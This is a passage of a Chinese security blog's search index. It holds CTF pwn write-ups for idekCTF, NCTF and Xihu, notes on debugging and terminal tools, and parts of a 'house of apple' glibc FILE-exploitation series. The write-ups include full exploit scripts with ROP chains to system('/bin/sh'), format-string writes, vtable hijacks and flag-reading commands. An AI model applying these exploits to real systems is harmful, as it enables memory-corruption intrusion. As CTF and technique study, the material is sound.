◂— 0x7f711350000000 0f:0078│ 0x7fff30421088 ◂— 0xc2a09b22b220ad00 10:0080│ rbp 0x7fff30421090 —▸ 0x7f711350000a ◂— hlt 此时，[rbp]指向的内容是exec+0xa，并且函数调用结束后，会ret到0x7f711350000a。 因此，修改掉rbp指向的内容为exec + ??，然后执行shellcode即可。 用什么存储shellcode呢，答案在0x1字节码。 0x1: 往栈上写值 b_xx -\u003e var2idx(xx1) var q_num # 8个字节 mov rsi, q_num lea rdi, [rbp + var] mov [rdi], rsi","date":"2023-02-02","objectID":"/zh-cn/2023-02-02-2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bpwn-jit/:0:0","tags":["pwn","jit"],"title":"2023西湖论剑初赛pwn-jit","uri":"/zh-cn/2023-02-02-2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bpwn-jit/"},{"categories":["tools"],"content":" 使用decomp2dbg工具，统筹使用IDA和gdb调试程序。截至到目前(2022-02-07)，测试出工具的缺陷在于：函数较多时，会陷入卡顿状态；打开vmlinux，插件启动报错。 IDA和gdb的交互，很多gdb的插件都实现了一些，但是实现得最好的，还得是mahaloz/decomp2dbg: A plugin to introduce interactive symbols into your debugger from your decompiler (github.com)。这个项目很早之前就关注了，但是最开始其主要是基于pwndbg和gef实现的二次开发。 今天又逛到了这个仓，发现作者重新实现了一遍，不再依赖这两个插件，使得原生的gdb也能直接使用。目前，工具已经实现了很多实用的功能，因此，本篇博客简要记录一下该工具的使用步骤。 1-安装\r对于windows上使用IDA的场景，选择手动安装会更好。苹果可以选择自动安装。手动安装的步骤如下： 首先，去官网clone仓库，拷贝decompilers/d2d_ida/*到IDA/plugins目录下面。 然后，在linux系统（WSL或者虚拟机均可）里面执行： pip3 install . \u0026\u0026 \\ cp d2d.py ~/.d2d.py \u0026\u0026 echo \"source ~/.d2d.py\" \u003e\u003e ~/.gdbinit 最后，在windows机器的防火墙中添加一个入站规则，选择端口为tcp/3662，只对私有域放行端口。 2-使用\r第一步，使用IDA打开一个程序，然后在edit/plugins中选择Decomp2DBG，选择监听0.0.0.0和3662端口。 第二步，使用gdb调试同一个程序，启动之后，直接键入decompiler connect ida --host 192.168.xxx.xxx(LAN IP) --port 3662。就可以同步更新IDA的反编译代码了。 之后在IDA重命名了函数或者变量，也会在gdb中更新，并可以直接打印。还支持打印结构体，同步栈变量，断点等等，功能非常强大。 这样在gdb调试的时候，就知道程序运行到哪个函数了。 使用pwncli的话，可以使用命令pwncli de ./pwn -t -s \"decompiler connect ida --host 192.168.xxx.xxx --port 3662\" -b func，这个时候，func可以指定为IDA中重命名的函数，示例如下。 IDA里面是这样的： 以下为操作示例。 目前该工具已经支持调试so，其开发的功能概览如下： 总的来看，这个工具适合调试一些虚拟机或者分支很多的程序，或者结构体很复杂的程序。期待新的功能~ ","date":"2023-01-30","objectID":"/zh-cn/2023-01-30-%E4%BD%BF%E7%94%A8decomp2dbg%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F/:0:0","tags":["pwn","gdb","IDA"],"title":"使用decomp2dbg调试程序","uri":"/zh-cn/2023-01-30-%E4%BD%BF%E7%94%A8decomp2dbg%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F/"},{"categories":["tools"],"content":" 简易记录asciinema工具录制命令行操作的使用教程。 有时候需要分享命令行操作的全过程，asciinema是一个很好用的工具，开源免费，配合tmux使用直接起飞。 我使用该工具录制了pwncli的使用教程。 asciinema会将屏幕上的所有信息保存下载，生成一个cast后缀的文件，并且其还提供了一个工具将cast文件转化为gif。 想掌握全部的使用技巧，点击其官方网站asciinema/asciinema: Terminal session recorder 📹 (github.com)阅读readme文件即可。 1-安装\r在ubuntu上安装的方式有两种： sudo apt install asciinema pipx install asciinema 2-录制\rasciinema rec -t \"title\" cast_file_path 3-播放\rasciinema play cast_file_path 4-上传\r首先可以登录asciinema - Record and share your terminal sessions, the simple way这个网站。 然后： asciinema auth 会生成一个链接，点击一下。 接下来： asciinema upload cast_file_path 即可上传。 上传成功后会有一个链接，点击链接即可访问。然后可以修改标题和描述，并将录制的内容公开。 5-搭配tmux\r搭配tmux可以录制分屏操作，在多个窗口之间切换。步骤如下： 首先，tmux new-s -t xxx新建一个会话 然后，asciinema rec -c \"tmux a -t xxx\"进行录制 录制结束后，要detach会话，接着按Ctrl+C即可就结束录制 6-转为gif\r有时候想把过程放在PPT或者网页上，可以使用asciinema/agg: asciinema gif generator (github.com)工具将其转化为gif。程序使用rust编写，速度很快。 ","date":"2023-01-29","objectID":"/zh-cn/2023-01-29-asciinema-%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/:0:0","tags":["asciinema"],"title":"asciinema 使用记录","uri":"/zh-cn/2023-01-29-asciinema-%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/"},{"categories":["pwn-wp"],"content":" 记录2022-idekctf所有的pwn题的wp。 附件下载\r点击这里下载题目附件。 1-Typop\r题目描述如下： 简单题，直接放exp： #!/usr/bin/env python3 # Link: https://github.com/RoderickChan/pwncli # Usage: # Debug : python3 exp.py debug elf-file-path -t -b malloc # Remote: python3 exp.py remote elf-file-path ip:port # nc typop.chal.idek.team 1337 # idek{2_guess_typos_do_matter} from pwncli import * cli_script() io: tube = gift.io elf: ELF = gift.elf libc: ELF = gift.libc def f1(data): sla(\"Do you want to complete a survey?\\n\", \"y\") sa(\"Do you like ctf?\\n\", data) ru(\"You said: \") m = rl() return m def f2(data): sa(\"Can you provide some extra feedback?\\n\", data) return m m = f1(\"a\"*11) canary = u64_ex(m[11:11+7]) \u003c\u003c 8 stack_addr = u64_ex(m[-7:-1]) leak(\"canary\", canary) leak(\"stack addr\", stack_addr) f2(\"\\x00\"*11) # leak pie address m = f1(\"a\"*0x1a) codeaddr = u64_ex(m[-7:-1]) leak(\"code addr\", codeaddr) codebase = codeaddr - elf.sym.main - 55 set_current_code_base_and_log(codebase) CurrentGadgets.set_find_area(1, 0) f2(flat([ \"a\"*10, canary, stack_addr, CurrentGadgets.pop_rdi_ret(), elf.got.read, elf.plt.puts, elf.sym.getFeedback ])) libcbase = recv_current_libc_addr(libc.sym.read) set_current_libc_base_and_log(libcbase) sa(\"Do you like ctf?\\n\", \"y\") CurrentGadgets.set_find_area(1, 1) f2(flat([ \"a\"*10, canary, stack_addr, CurrentGadgets.pop_rdi_ret(), CurrentGadgets.bin_sh(), CurrentGadgets.ret(), libc.sym.system ])) sleep(0.5) sl(\"cat flag*\") ia() 2-Sprinter\r题目描述如下： 题目分析\r漏洞很简单，给了栈地址，然后是一个裸的sprintf，不过此时的buf和fmt都指向同一块内存。 对输入做了限制： 不能包含n字符 strlen(s)必须小于等于 0x26 解题思路\rsprintf函数原型为：int sprintf(char *buf, const char *fmt, ...); 这题考察的sprintf其实和printf没啥太大区别，只要稍微分析过sprintf源码就能很快解出此题。 sprintf/printf最后都会调用到__vfprintf_internal，其第一个参数是FILE *fp文件指针，只不过sprintf的fp是在栈上构造出来的，而printf的fp指向stdout结构体。 在输出字符串的时候，会调用到_IO_default_xsputn，而在构造fp的时候，fp-\u003e_IO_write_base和fp-\u003e_IO_write_ptr会指向buf，由于此时fmt和buf指向的是同一片内存区域，sprintf在调用的时候一边解析一边存储字符串，因此在执行_IO_default_xsputn的时候，会发生内存重叠，从而会有一些很看似很奇怪但是读了源码就能明白的行为。 比如：buf = \"a%s\\x00\"的时候，sprintf(buf, buf)会输出aaaaa，一共5个a。为什么会输出5个？ 第一次调用_IO_default_xsputn(fp, buf, 1)，因为字符串一开始是a，为了输出这个a到fp，调用后fp-\u003e_IO_write_ptr会指向buf+1 第二次调用_IO_default_xsputn(fp, buf, 3)，因此此时解析到了%s，那么就计算strlen(buf)为3，也就是第三个参数。此时，首先有个mempcpy (f-\u003e_IO_write_ptr, buf, 3)，然后有一个循环，结束后buf变为了aaaa 由于此时buf变成了aaaa，fmt也变成了aaaa，此时解析的idx（从0开始）偏移到了2，然后会继续解析，就会第四次调用_IO_default_xsputn(fp, buf, 1)，这里是输出aaaa的最后一个a，于是在buf后面再加上一个a，buf就变成了aaaaa 只要理解到sprintf(buf, fmt, ...)，是一边解析到fmt的字符串，一边将解析的内容填充到buf指向的内存，就可以很好的构造字符串，然后调用到%n，从而往已知地址写内容。 理解了sprintf的行为，那么输入buf = b\"ab%s\\x00\\x00\\x00\\x00%7$n\\x00\\x00\\x00\\x00\" + p64(0xdeadbeef)，既可以绕过检查，还能往0xdeadbeef的内存改写为8。调试截图如下： 结合前面泄露的栈地址，题目的got表可写，我的思路为： 修改rbp为0x404128 修改ret为0x401214，这样可以调用fgets往0x404018处写内容，而这里是got表区域 写strchr@got为0x401060，这样就会调用printf，用于输出libc地址 写__stack_chk_fail@got为0x40122f，继续调用fgets往0x404018处写 此时可以写strchr@got为system地址，调用system(\"/bin/sh\") EXP\r#!/usr/bin/env python3 # Link: https://github.com/RoderickChan/pwncli # Usage: # Debug : python3 exp.py debug elf-file-path -t -b malloc # Remote: python3 exp.py remote elf-file-path ip:port # nc sprinter.chal.idek.team 1337 # idek{help!_sprintf_ate_my_payload_and_i_cant_get_it_back!} from pwncli import * cli_script() set_remote_libc('libc-2.31.so') io: tube = gift.io elf: ELF = gift.elf libc: ELF = gift.libc ru(\"Enter your string into my buffer, located at \") m = ru(\":\") stackaddr = int16_ex(m[:-1]) leak(\"stack addr\", stackaddr) s(flat_z({ 0: f\"ABCDEF%s\", 0x14: [ \"%36$hhn\", \"a\"*0x14, \"%35$ln\", \"a\"*(0x40-0x28), \"%33$n\", \"a\", # 0x41 \"%34$hhn\" ], 0xe0: stackaddr + 0x110 + 2, 0xe8: stackaddr + 0x110+1, 0xf0: stackaddr + 0x110, 0xf8: p64(stackaddr + 0x118)[:7], # 36 }, length=0xff)) sla(\"Enter your string into my buffer\", flat({ 0: \"%3$p\\x00\", 8: 0x40122f, 0x10: 0x401060 })) ru(\"0x7f\") m = rn(10) libcaddr = int16_ex(b\"0x7f\" + m) leak(\"libc addr\", libcaddr) set_current_libc_base_and_log(libcaddr, 0x10dfd2) sl(flat_z({ 0: \"/bin/sh\\x00\", 0x10: libc.sym.system+27 })) sleep(0.5) sl(\"cat flag*\") ia() 3-Relativity\r题目描述如下： 题目分析\rgot表可写，一次格式化字符串攻击的机会。 一次机会，打哪里呢，答","date":"2023-01-15","objectID":"/zh-cn/2023-01-15-2022-idekctf-all-pwn-wp/:0:0","tags":["pwn","blog"],"title":"2022-idekCTF-all-pwn-wp","uri":"/zh-cn/2023-01-15-2022-idekctf-all-pwn-wp/"},{"categories":["pwn-wp"],"content":"2022 nctf all pwn wp","date":"2022-12-14","objectID":"/zh-cn/2022-12-14-2022-nctf-pwn/","tags":["pwn"],"title":"2022-nctf-pwn-wp","uri":"/zh-cn/2022-12-14-2022-nctf-pwn/"},{"categories":["pwn-wp"],"content":" 总结2022-nctf的题目，主要关注chroot逃逸的手法。 点击这里查看官方wp，点击这里下载附件。chroot需要登录到ssh上去操作，没有给附件。 阅读之前，先听首歌放松一下心情吧！ Ezlogin\r首先说一下我发现的漏洞，在read_file的时候，可以溢出无限读，恰好又能溢出到FILE结构体。动态调试后发现，在关闭文件流的时候，FILE结构的vtable并没有检查。而在结束了阅读文件后，会调用fclose(FILE)函数，会调用到对应的函数指针。 溢出之后，控制vtable调用_IO_default_pbackfail函数，将0x5db650处写为非0，即可调用到后门函数： _IO_default_pbackfail的分析如下： int _IO_default_pbackfail (FILE *fp, int c) { if (fp-\u003e_IO_read_ptr \u003e fp-\u003e_IO_read_base \u0026\u0026 !_IO_in_backup (fp) \u0026\u0026 (unsigned char) fp-\u003e_IO_read_ptr[-1] == c) --fp-\u003e_IO_read_ptr; else { // 进入到这里 /* Need to handle a filebuf in write mode (switch to read mode). FIXME!*/ if (!_IO_in_backup (fp)) { //不进这个分支 } else if (fp-\u003e_IO_read_ptr \u003c= fp-\u003e_IO_read_base) { //也不进这个分支 } *--fp-\u003e_IO_read_ptr = c;//设置fp-\u003e_IO_read_ptr为0x5db650+1即可 } return (unsigned char) c; } 因此，exp如下： #!/usr/bin/env python3 # Date: 2022-12-03 09:58:11 # Link: https://github.com/RoderickChan/pwncli # Usage: # Debug : python3 exp.py debug elf-file-path -t -b malloc # Remote: python3 exp.py remote elf-file-path ip:port from pwncli import * cli_script() io: tube = gift.io def wc(what, data): sla(\"\u003e\u003e \", str(what)) sla(\"Please put the content you want to encrypt into '1.txt' \\n\", data) sla(\"When you finish please input 'Y'\\n\", \"Y\") canary = u64_ex(rn(7)) \u003c\u003c 8 leak(\"canary\", canary) stack = u64_ex(rn(6)) leak(\"stack\", stack) ff = IO_FILE_plus_struct() ff.flags = 0xfbad2184 ff._IO_read_base = 0x5db650 ff._IO_read_ptr = 0x5db651 ff._IO_read_end = 0x5db650 ff.chain = 0x5d9700 ff.fileno = 3 ff._lock = 0x5d9700-0x10 ff.vtable = 0x5db240-0x58 wc(1, b\"deadbeef\"+ b\"\\0\"*0x1000 + p64(0x1e1) + bytes(ff)) sla(\"\u003e\u003e \", \"6\") sleep(1) sl(\"cat flag*\") ia() 官方给出的漏洞点在tea加密的时候，有数组的溢出。 看了下，确实有： 可以在这里复习一下tea加密的相关内容，参考这篇博客1。 检查输入的时候，会修改v28数组的最低字节的内容，也就是上图的第42行。那么就可以利用这一点修改掉retaddr为后门函数地址。只需要修改最低字节即可。这里的长度自然也会乘4，但不会影响下面的运行。 官方的exp为： from pwn import* context(os='linux',arch='amd64',log_level='debug') s = remote('49.233.15.226', 8001) canary = u64(s.recv(7).rjust(8,b'\\x00')) success('canary=\u003e' + hex(canary)) s.sendlineafter(b\"3.exit\\n\u003e\u003e \", b\"1\") s.sendlineafter(b\"Please put the content you want to encrypt into '1.txt'\", b'a'*0x52 + b'*'+chr((canary\u003e\u003e32)\u00260xff).encode()+b'c'*6+b'\\x75**') s.sendlineafter(b\"When you finish please input 'Y'\\n\", b\"Y\") s.sendlineafter(b\"5.RC4\\n\u003e\u003e \", b\"4\") s.sendlineafter(b\"for example: 0x10 0x20 0x30 0x10 \\n\u003e \", b\"0x10 0x20 0x30 0x10\") sleep(1) s.sendline(b\"echo `base64 /flag` | base64 -d\") s.interactive() Ezlink\r常规题，最后要扫下目录。直接放exp。 #!/usr/bin/env python3 # Date: 2022-12-03 16:30:22 # Link: https://github.com/RoderickChan/pwncli # Usage: # Debug : python3 exp.py debug elf-file-path -t -b setcontext+53 # Remote: python3 exp.py remote elf-file-path ip:port from pwncli import * cli_script() set_remote_libc('libc-2.35.so') io: tube = gift.io elf: ELF = gift.elf libc: ELF = gift.libc def cmd(i, prompt=\"\u003e\u003e \"): sla(prompt, i) def add(data=\"\\x00\"*0xd0): cmd('1') sa(\"Please input your secret\\n\", data) def dele(): cmd('2') def peep(): cmd('3') ru(\"you only have two chances to peep a secret\\n\") return u64_ex(rn(8)) def distort(data): cmd('4') sa(\"Please input content\\n\", data) def calc_heap(addr): s = hex(addr)[2:] s = [int(x, base=16) for x in s] res = s.copy() for i in range(9): res[3+i] ^= res[i] res = \"\".join([hex(x)[2:] for x in res]) return int16_ex(res) def xor_fd(addr, fd): return (addr \u003e\u003e 12) ^ fd add() dele() addr = calc_heap(peep()) leak(\"addr\", addr) heapbase = addr - 0x1590 log_heap_base_addr(heapbase) distort(p64_ex(xor_fd(heapbase+0x14b0, heapbase+0x300))) add(\"\\x60\") lb = set_current_libc_base_and_log(peep(), 0x246d60) payload = IO_FILE_plus_struct().house_of_apple2_stack_pivoting_when_exit( standard_FILE_addr=heapbase+0x1880, _IO_wfile_jumps_addr=libc.sym._IO_wfile_jumps, leave_ret_addr=0x000000000005a170 + lb, pop_rbp_addr=0, fake_rbp_addr=0 ) dele() add() add(payload[0x10:]) distort(b\"a\"*0x88 + p64(lb + 0x00000000000435ca)) add(b\"a\"*0x18+flat([ 0x000000000002a3e5 + lb, heapbase, 0x000000000002be51 + lb, 0x8000, 0x000000000011f497 +lb, 7, 0, libc.sy","date":"2022-12-14","objectID":"/zh-cn/2022-12-14-2022-nctf-pwn/:0:0","tags":["pwn"],"title":"2022-nctf-pwn-wp","uri":"/zh-cn/2022-12-14-2022-nctf-pwn/"},{"categories":["questions"],"content":" 记录一下使用wsl2的时候遇到的问题和解决方案。 1 更新内核头文件和支持编译ko\r复现CVE的时候发现io_uring.h缺失一些宏定义。 参考WSL升级到最新版本Linux内核headers的方法 - 知乎 (zhihu.com)。不要在/mnt目录下编译。 步骤如下： 使用uname -r查看当前内核的版本 到Releases · microsoft/WSL2-Linux-Kernel (github.com)下载对应版本的源码 解压缩源码tar -zxvf xxxx.tar.gz 进入源码文件夹，拷贝配置文件cp Microsoft/config-wsl .config 安装所需依赖sudo apt install libelf-dev build-essential pkg-config bison build-essential flex libssl-dev libelf-dev bc dwarves 执行命令make oldconfig \u0026\u0026 make prepare \u0026\u0026 make scripts \u0026\u0026 sudo make modules \u0026\u0026 sudo make modules_install \u0026\u0026 make headers_install \u0026\u0026 sudo cp -r ./usr/include/* /usr/include 之后编译ko更改一下include path即可。 如果想编译任意版本的linux ko，需要四步： 下载对应版本源码 编译bzImage make modules 更改Makefile中的表示kernel include dir的这个变量即可 2 Wsl中的runlevel问题\r安装一些软件包的时候，会报出一些关于runlevel的错误，这个时候： export RUNLEVEL=1 sudo apt install --reinstall xxxx 3 WSL2中安装kali，使用apt Install报错\r如图所示解决即可： 4 WSL 中挂载windows磁盘的权限问题\r有时候需要控制/mnt/x/的权限，需要在对应的操作系统中，新建一个文件/etc/wsl.conf。输入以下内容： [automount] uid=1000 gid=1000 umask=022 之后就能看到宿主机磁盘文件的权限，属主变成了1000的用户。 主要是为了解决直接从 linux 系统中访问 windows 磁盘文件的权限问题。 5 清空 Wsl 的磁盘数据\r不管使用的是 wsl 的什么操作系统，或者使用 backend 是 wsl 的 docker desktop，都会生成一个名为 ext4.vhdx 的文件，这个文件随着系统的使用会越来越大，而且只会变大，不会变小。那么，有时候需要在适当的时候压缩一下这个文件，释放出空间。 其实很简单，使用这个命令即可：Optimize-VHD (Hyper-V) | Microsoft Learn 压缩之前，可以先执行一下 docker system prune 然后：wsl.exe --shutdown 然后在 powershell 中执行 Optimize-VHD -Path \"YourPath\\ext4.vhdx\" -Mode Full 修改一下对应的文件路径即可。 之后，就可以完美释放 wsl 使用过程中占用的磁盘空间。 ","date":"2022-11-28","objectID":"/zh-cn/2022-11-28-wsl%E4%BD%BF%E7%94%A8%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/:0:0","tags":["wsl"],"title":"WSL使用问题记录","uri":"/zh-cn/2022-11-28-wsl%E4%BD%BF%E7%94%A8%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"categories":["pwn-trick"],"content":" 本文首发于看雪论坛，仅在个人博客记录 分享一系列新的glibc中IO利用思路，暂且命名为house of apple。 这篇是house of apple3。 本站的house of apple系列文章的地址为： house of apple1 house of apple2 house of apple3 前言\r之前提出了一种新的IO利用方法 house of apple，并已经发布了house of apple1和house of apple2，其中house of apple1中的利用链能任意地址写堆地址，house of apple2中的利用链能通过控制FILE结构体的_wide_data成员去直接控制程序执行流。本篇是house of apple系列的第三篇，继续给出基于FILE-\u003e_wide_data的有关利用技巧（利用链仍然与FILE-\u003e_wide_data操作有一点相关）。 前两篇文章中的利用链主要关注_wide_data成员，而本篇文章并不会特别关注_wide_data，而是关注FILE结构体的另外一个成员_codecvt的利用。 本篇的house of apple3同样会给出几条新的IO利用链，在劫持FILE-\u003e_codecvt的基础上，直接控制程序执行流。 关于前置知识点击 house of apple1进行查看。 文章中的fp为一个FILE类型的指针，以下分析均基于amd64程序。 利用条件\r使用house of apple3的条件为： 已知heap地址和glibc地址 能控制程序执行IO操作，包括但不限于：从main函数返回、调用exit函数、通过__malloc_assert触发 能控制_IO_FILE的vtable和_codecvt，一般使用largebin attack去控制 注意： 上面提到，本篇文章并不会特别关注_wide_data成员，这是因为_wide_data设置不当的话会影响某些利用链的分支走向。但是，如果采用默认的_wide_data成员（默认会指向_IO_wide_data_2，除了_wide_vtable外其他成员均默认为0），也并不影响house of apple3的利用。 因此，如果能伪造整个FILE结构体，则需要设置合适的_wide_data；如果只能伪部分FILE的成员的话，保持fp-\u003e_wide_data为默认地址即可。 利用原理\rFILE结构体中有一个成员struct _IO_codecvt *_codecvt;，偏移为0x98。该结构体参与宽字符的转换工作，结构体被定义为： // libio\\libio.h:115 struct _IO_codecvt { _IO_iconv_t __cd_in; _IO_iconv_t __cd_out; }; 可以看到，__cd_in和__cd_out是同一种类型的数据。往下拆，结构体_IO_iconv_t被定义为： // libio\\libio.h:51 typedef struct { struct __gconv_step *step; struct __gconv_step_data step_data; } _IO_iconv_t; 继续拆，来看struct __gconv_step： // iconv\\gconv.h:84 /* Description of a conversion step. */ struct __gconv_step { struct __gconv_loaded_object *__shlib_handle;// 关注这个成员 const char *__modname; /* For internal use by glibc. (Accesses to this member must occur when the internal __gconv_lock mutex is acquired). */ int __counter; char *__from_name; char *__to_name; __gconv_fct __fct;// 关注这个成员 __gconv_btowc_fct __btowc_fct; __gconv_init_fct __init_fct; __gconv_end_fct __end_fct; /* Information about the number of bytes needed or produced in this step. This helps optimizing the buffer sizes. */ int __min_needed_from; int __max_needed_from; int __min_needed_to; int __max_needed_to; /* Flag whether this is a stateful encoding or not. */ int __stateful; void *__data; /* Pointer to step-local data. */ }; 然后来看struct __gconv_step_data结构体： /* Additional data for steps in use of conversion descriptor. This is allocated by the `init' function. */ struct __gconv_step_data { unsigned char *__outbuf; /* Output buffer for this step. */ unsigned char *__outbufend; /* Address of first byte after the output buffer. */ /* Is this the last module in the chain. */ int __flags; /* Counter for number of invocations of the module function for this descriptor. */ int __invocation_counter; /* Flag whether this is an internal use of the module (in the mb*towc* and wc*tomb* functions) or regular with iconv(3). */ int __internal_use; __mbstate_t *__statep; __mbstate_t __state; /* This element must not be used directly by any module; always use STATEP! */ }; 以上两个结构体均会被用于字符转换，而在利用的过程中，需要精准控制结构体中的某些成员，避免引发内存访问错误。 house of apple3的利用主要关注以下三个函数：__libio_codecvt_out、__libio_codecvt_in和__libio_codecvt_length。三个函数的利用点都差不多，以__libio_codecvt_in为例，源码分析如下： enum __codecvt_result __libio_codecvt_in (struct _IO_codecvt *codecvt, __mbstate_t *statep, const char *from_start, const char *from_end, const char **from_stop, wchar_t *to_start, wchar_t *to_end, wchar_t **to_stop) { enum __codecvt_result result; // gs 源自第一个参数 struct __gconv_step *gs = codecvt-\u003e__cd_in.step; int status; size_t dummy; const unsigned char *from_start_copy = (unsigned char *) from_start; codecvt-\u003e__cd_in.step_data.__outbuf = (unsigned char *) to_start; codecvt-\u003e__cd_in.step_data.__outbufend = (unsigned char *) to_end; codecvt-\u003e__cd_in.step_data.__statep = statep; __gconv_fct fct = gs-\u003e__fct; #ifdef PTR_DEMANGLE // 如果gs-\u003e__shlib_handle不为空，则会用__pointer_guard去解密 // 这里如果可控，设置为NULL即可绕过解密 if (gs-\u003e__shlib_handle != NULL) PTR_DEMANGLE (fct); #endif // 这里有函数指针调用 // 这个宏就是调用fct(gs, ...) status = DL_CALL_FCT (fct, (gs, \u0026codecvt-\u003e__cd_in.step_data, \u0026from_start_copy, (const unsigned char *) from_end, NULL","date":"2022-10-18","objectID":"/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-3/:0:0","tags":["pwn","house of","glibc"],"title":"House of Apple 一种新的glibc中IO攻击方法 (3)","uri":"/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-3/"},{"categories":["pwn-trick"],"content":" 本文首发于看雪论坛，仅在个人博客记录 分享一系列新的glibc中IO利用思路，暂且命名为house of apple。 这篇是house of apple2。 本站的house of apple系列文章的地址为： house of apple1 house of apple2 house of apple3 前言\r之前提出了一种新的IO利用方法house of apple1。本篇是house of apple1的续集，继续给出基于IO_FILE-\u003e_wide_data的利用技巧。 在 house of apple1的总结里面提到: house of apple1 的利用链可以在任意地址写堆地址，相当于一次largebin attack的效果。因此，house of apple1 需要和其他方法结合而进行后续的FSOP利用。 那么在只劫持_wide_data的条件下能不能控制程序的执行流呢？答案是肯定的。 本篇的house of apple2会提出几条新的IO利用链，在劫持_IO_FILE-\u003e_wide_data的基础上，直接控制程序执行流。 关于前置知识这里就不赘述了，详情可看 house of apple1。 利用条件\r使用house of apple2的条件为： 已知heap地址和glibc地址 能控制程序执行IO操作，包括但不限于：从main函数返回、调用exit函数、通过__malloc_assert触发 能控制_IO_FILE的vtable和_wide_data，一般使用largebin attack去控制 利用原理\rstdin/stdout/stderr这三个_IO_FILE结构体使用的是_IO_file_jumps这个vtable，而当需要调用到vtable里面的函数指针时，会使用宏去调用。以_IO_file_overflow调用为例，glibc中调用的代码片段分析如下 #define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH) #define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-\u003eFUNC) (THIS, X1) # define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS))) 其中，IO_validate_vtable函数负责检查vtable的合法性，会判断vtable的地址是不是在一个合法的区间。如果vtable的地址不合法，程序将会异常终止。 观察struct _IO_wide_data结构体，发现其对应有一个_wide_vtable成员。 struct _IO_wide_data { wchar_t *_IO_read_ptr; /* Current read pointer */ wchar_t *_IO_read_end; /* End of get area. */ wchar_t *_IO_read_base; /* Start of putback+get area. */ wchar_t *_IO_write_base; /* Start of put area. */ wchar_t *_IO_write_ptr; /* Current put pointer. */ wchar_t *_IO_write_end; /* End of put area. */ wchar_t *_IO_buf_base; /* Start of reserve area. */ wchar_t *_IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ wchar_t *_IO_save_base; /* Pointer to start of non-current get area. */ wchar_t *_IO_backup_base; /* Pointer to first valid character of backup area */ wchar_t *_IO_save_end; /* Pointer to end of non-current get area. */ __mbstate_t _IO_state; __mbstate_t _IO_last_state; struct _IO_codecvt _codecvt; wchar_t _shortbuf[1]; const struct _IO_jump_t *_wide_vtable; }; 在调用_wide_vtable虚表里面的函数时，同样是使用宏去调用，仍然以vtable-\u003e_overflow调用为例，所用到的宏依次为： #define _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH) #define WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-\u003eFUNC) (THIS, X1) #define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS) #define _IO_WIDE_JUMPS(THIS) \\ _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-\u003e_wide_vtable 可以看到，在调用_wide_vtable里面的成员函数指针时，没有关于vtable的合法性检查。 因此，我们可以劫持IO_FILE的vtable为_IO_wfile_jumps，控制_wide_data为可控的堆地址空间，进而控制_wide_data-\u003e_wide_vtable为可控的堆地址空间。控制程序执行IO流函数调用，最终调用到_IO_Wxxxxx函数即可控制程序的执行流。 以下面提到的_IO_wdefault_xsgetn函数利用为例，编写demo示例如下： #include\u003cstdio.h\u003e #include\u003cstdlib.h\u003e #include\u003cstdint.h\u003e #include\u003cunistd.h\u003e #include \u003cstring.h\u003e void backdoor() { printf(\"\\033[31m[!] Backdoor is called!\\n\"); _exit(0); } void main() { setbuf(stdout, 0); setbuf(stdin, 0); setbuf(stderr, 0); char *p1 = calloc(0x200, 1); char *p2 = calloc(0x200, 1); puts(\"[*] allocate two 0x200 chunks\"); size_t puts_addr = (size_t)\u0026puts; printf(\"[*] puts address: %p\\n\", (void *)puts_addr); size_t libc_base_addr = puts_addr - 0x84420; printf(\"[*] libc base address: %p\\n\", (void *)libc_base_addr); size_t _IO_2_1_stderr_addr = libc_base_addr + 0x1ed5c0; printf(\"[*] _IO_2_1_stderr_ address: %p\\n\", (void *)_IO_2_1_stderr_addr); size_t _IO_wstrn_jumps_addr = libc_base_addr + 0x1e8c60; printf(\"[*] _IO_wstrn_jumps address: %p\\n\", (void *)_IO_wstrn_jumps_addr); char *stderr2 = (char *)_IO_2_1_stderr_addr; puts(\"[+] step 1: change stderr-\u003e_flags to 0x800\"); *(size_t *)stderr2 = 0x800; puts(\"[+] step 2: change stderr-\u003e_mode to 1\"); *(size_t *)(stderr2 + 0xc0) = 1; puts(\"[+] step 3: change stderr-\u003evtable to _IO_wstrn_jumps-0x20\"); *(size_t *)(stderr2 + 0xd8) = _IO_wstrn_jumps_addr-0x20; puts(\"[+] step 4: replace stderr-\u003e_wide_data with the allocated chunk p1\"); *(size_t *)(stderr2 + 0xa0) = (size_t)p1; puts(\"[+] step 5: set stderr-\u003e_wide_data-\u003e_wide_vtable with the allocated chunk p2\"); *(size_t *)(p1 + 0xe0) = (size_t)p2; puts(\"[+] step 6: set stderr-","date":"2022-10-18","objectID":"/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/:0:0","tags":["pwn","house of","glibc"],"title":"House of Apple 一种新的glibc中IO攻击方法 (2)","uri":"/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/"},{"categories":["pwn-trick"],"content":" 本文首发于看雪论坛，仅在个人博客记录 分享一系列新的glibc中IO利用思路，暂且命名为house of apple。 